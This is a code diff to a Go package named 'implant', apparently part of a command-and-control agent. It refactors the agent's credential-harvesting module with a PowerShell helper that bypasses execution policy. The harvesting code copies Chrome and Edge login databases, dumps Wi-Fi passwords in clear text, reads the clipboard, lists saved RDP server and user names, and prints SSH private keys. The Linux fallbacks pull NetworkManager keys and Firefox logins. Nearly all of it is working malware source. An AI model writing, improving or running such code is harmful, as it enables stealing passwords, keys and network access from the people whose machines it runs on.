@@ -1,10 +1,37 @@
 package implant
 
 import (
+	"bytes"
+	"context"
 	"fmt"
+	"os/exec"
 	"runtime"
 	"strings"
+	"time"
 )
+
+// executePowerShell runs a PowerShell script directly (bypassing cmd.exe)
+// to avoid quote escaping issues with complex PowerShell commands.
+func executePowerShell(script string) ([]byte, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	output := stdout.Bytes()
+	if stderr.Len() > 0 {
+		if len(output) > 0 {
+			output = append(output, '\n')
+		}
+		output = append(output, stderr.Bytes()...)
+	}
+	if err != nil && len(output) == 0 {
+		return []byte(err.Error()), err
+	}
+	return output, nil
+}
 
 // CredentialHarvester collects credentials from various sources.
 
@@ -81,13 +108,7 @@ func harvestAll() ([]byte, error) {
 
 func harvestBrowserCreds() ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		ps := "$paths = @(" +
-			"@{N='Chrome';P=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Default\\Login Data'}," +
-			"@{N='Edge';P=$env:LOCALAPPDATA+'\\Microsoft\\Edge\\User Data\\Default\\Login Data'}" +
-			"); foreach($b in $paths){ if(Test-Path $b.P){ Write-Output ('['+$b.N+'] Found: '+$b.P); " +
-			"$t=$env:TEMP+'\\ld_copy'; Copy-Item $b.P $t -Force 2>$null; Write-Output ('  Copied to: '+$t)" +
-			"} else { Write-Output ('['+$b.N+'] Not found') } }"
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return executePowerShell(`$paths = @(@{N='Chrome';P=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data'},@{N='Edge';P=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Login Data'}); foreach($b in $paths){ if(Test-Path $b.P){ '['+$b.N+'] Found: '+$b.P; $t=$env:TEMP+'\ld_copy'; Copy-Item $b.P $t -Force 2>$null; '  Copied to: '+$t } else { '['+$b.N+'] Not found' } }`)
 	}
 
 	// Linux
@@ -101,15 +122,14 @@ for f in $(find ~/.mozilla/firefox -name "logins.json" 2>/dev/null); do echo "--
 
 func harvestWifiPasswords() ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		ps := "netsh wlan show profiles | Select-String '\\:(.+)$' | ForEach-Object { $p=$_.Matches.Groups[1].Value.Trim(); $k=(netsh wlan show profile name=$p key=clear | Select-String 'Key Content\\W+\\:(.+)$'); if($k){ Write-Output ($p+' : '+$k.Matches.Groups[1].Value.Trim()) } else { Write-Output ($p+' : (no password)') } }"
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return executePowerShell(`$profiles = netsh wlan show profiles 2>$null; if ($profiles) { $profiles | ForEach-Object { if ($_ -match ':\s+(.+)$') { $p = $Matches[1].Trim(); $detail = netsh wlan show profile name="$p" key=clear 2>$null; $key = ($detail | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s+',''; if ($key) { "$p : $key" } else { "$p : (no password)" } } } } else { 'No WiFi profiles found' }`)
 	}
 	return ExecuteShell([]string{`grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | sed 's/.*psk=//' || echo "No WiFi passwords found (need root)"`})
 }
 
 func harvestClipboard() ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", "Get-Clipboard"})
+		return executePowerShell("Get-Clipboard")
 	}
 	return ExecuteShell([]string{`xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo "Clipboard tools not available"`})
 }
@@ -125,13 +145,12 @@ func harvestRDPCreds() ([]byte, error) {
 	if runtime.GOOS != "windows" {
 		return []byte("RDP credentials: Windows-only feature"), nil
 	}
-	ps := `$rdpServers = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue; if ($rdpServers) { foreach ($s in $rdpServers) { $name = $s.PSChildName; $user = $s.GetValue("UsernameHint"); Write-Output "$name : $user" } } else { Write-Output "No saved RDP credentials found" }`
-	return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+	return executePowerShell(`$servers = Get-ChildItem 'HKCU:\Software\Microsoft\Terminal Server Client\Servers' -EA SilentlyContinue; if ($servers) { foreach ($s in $servers) { $s.PSChildName + ' : ' + $s.GetValue('UsernameHint') } } else { 'No saved RDP credentials found' }`)
 }
 
 func harvestSSHKeys() ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", `Get-ChildItem "$env:USERPROFILE\.ssh" -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ("--- " + $_.Name + " ---"); Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-Object -First 5 }`})
+		return executePowerShell(`Get-ChildItem "$env:USERPROFILE\.ssh" -EA SilentlyContinue | ForEach-Object { '--- ' + $_.Name + ' ---'; Get-Content $_.FullName -EA SilentlyContinue | Select-Object -First 5 }`)
 	}
 	return ExecuteShell([]string{`echo "=== SSH Keys ===" && ls -la ~/.ssh/ 2>/dev/null && echo "" && for f in ~/.ssh/id_*; do echo "--- $f ---"; head -2 "$f" 2>/dev/null; echo "..."; done`})
 }
